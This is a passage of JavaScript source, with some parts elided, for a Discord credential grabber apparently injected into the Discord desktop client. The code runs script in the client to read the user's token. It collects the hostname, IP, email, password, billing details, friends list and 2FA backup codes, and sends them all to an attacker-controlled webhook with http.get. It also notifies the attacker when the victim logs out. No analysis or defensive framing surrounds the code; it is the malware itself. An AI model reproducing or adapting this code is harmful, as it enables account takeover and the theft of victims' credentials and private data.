	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
		if (config['init-notify'] == "true") {
			if (fs.existsSync(path.join(__dirname, "init"))) {
				...
				if (token == null || token == undefined || token == "") {
					var msg = `**KlasssGrabberbyCromomoz**\nDiscord Initalized (User not Logged in)\n----------Info----------\n\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``
                    var what = msg.replace("#", ":hash:");  
                    var query_string = encodeURI(what);
                    http.get(webhook+query_string)
				} else {
					const window = BrowserWindow.getAllWindows()[0];
                    ...
                    `, !0).then(a => {
						...
						var msg = `**KlasssGrabberbyCromomoz**\nDiscord Initalized (User not Logged in)\n----------Info----------\n\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\`\nUsername: \`${b.username}:hash:${b.discriminator}\`\nID: \`${b.id}\`\nBadges: ${GetBadges(b.flags)}\n https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                        var what = msg.replace("#", ":hash:");  
                        var query_string = encodeURI(what);
                        http.get(webhook+query_string)
					});
		...
		if (config.logout != "false" || config.logout == "%LOGOUT%") {
			if (config['logout-notify'] == "true") {
				if (token == null || token == undefined || token == "") {
                    var msg = `User log out (User not Logged in before)\n\n\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``
                    var what = msg.replace("#", ":hash:");  
                    var query_string = encodeURI(what);
                    http.get(webhook+query_string)
				} else {
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
                            ...
                            var msg = `Grabber\nInfo: \`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\`\nUsername\`${json.username}:hash:${json.discriminator}\`\nID: \`${json.id}\`\nNitro:${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nBilling: ${Cool()}\nEmail: \`${email}\`\nPassword: \`${password}\`\nToken: \`\`\`${token}\`\`\` \n\n\nTotal Friends (${totalFriends()})\n${CalcFriends()}`
							if (token.startsWith("mfa")) {
								var msg = `Grabber\nInfo: \`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\`\nUsername\`${json.username}:hash:${json.discriminator}\`\nID: \`${json.id}\`\nNitro:${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nBilling: ${Cool()}\nEmail: \`${email}\`\nPassword: \`${password}\`\nToken: \`\`\`${token}\`\`\` \n\n\nTotal Friends (${totalFriends()})\n${CalcFriends()}\n\n:detective: __2FA Codes__ \n${baseuri}\n${fieldo}`
							}
